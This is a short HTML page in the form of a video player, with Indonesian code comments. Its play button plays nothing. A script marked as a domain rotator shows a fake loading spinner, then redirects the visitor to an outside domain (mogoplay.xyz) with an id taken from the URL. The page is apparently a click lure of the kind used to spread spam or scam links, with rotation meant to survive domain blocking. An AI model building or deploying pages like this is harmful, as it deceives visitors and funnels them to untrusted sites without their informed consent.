<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Video Player</title>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">

<style>
* { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

body {
    background:#ffffff;
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
    margin:0;
    display:flex;
    flex-direction:column;
    align-items:center;
    padding-top:20px;
    padding-bottom:50px;
}

.video-container {
    position:relative;
    width:95%;
    max-width:600px;
    aspect-ratio:16/9;
    background:#000 url('https://images.unsplash.com/photo-1529139513055-07f9127e9544?q=80&w=600&auto=format&fit=crop') center/cover no-repeat;
    border-radius:12px;
    display:flex;
    justify-content:center;
    align-items:center;
    box-shadow:0 4px 15px rgba(0,0,0,0.2);
    cursor:pointer;
}

.play-btn-circle {
    width:70px;
    height:70px;
    background:rgba(255,255,255,0.95);
    border-radius:50%;
    display:flex;
    justify-content:center;
    align-items:center;
}

.play-btn-circle i {
    color:#000;
    font-size:28px;
    margin-left:4px;
}

.spinner-overlay {
    position:absolute;
    top:0; left:0;
    width:100%;
    height:100%;
    background:rgba(0,0,0,0.5);
    display:none;
    align-items:center;
    justify-content:center;
}

.spinner {
    border:4px solid rgba(255,255,255,0.2);
    border-top:4px solid #fff;
    border-radius:50%;
    width:50px;
    height:50px;
    animation:spin 1s linear infinite;
}

@keyframes spin {
    0% { transform:rotate(0deg); }
    100% { transform:rotate(360deg); }
}
</style>
</head>

<body>

<div class="video-container" onclick="redirectVideo()">
    <div class="play-btn-circle">
        <i class="fas fa-play"></i>
    </div>
    <div class="spinner-overlay" id="spinner">
        <div class="spinner"></div>
    </div>
</div>

<script>
// --- ROTATOR DOMAIN (VERSI JAVASCRIPT) ---

// Ambil parameter ?id=
const urlParams = new URLSearchParams(window.location.search);
const videoId = urlParams.get('id') || 'default';

// Daftar domain
const daftarDomain = [
    "https://mogoplay.xyz/v/",
];

// Acak domain
const domainTerpilih = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
const finalLink = domainTerpilih + videoId;

// Fungsi redirect saat klik
function redirectVideo() {
    document.getElementById("spinner").style.display = "flex";
    setTimeout(function(){
        window.location.href = finalLink;
    }, 1200);
}
</script>

</body>
</html>
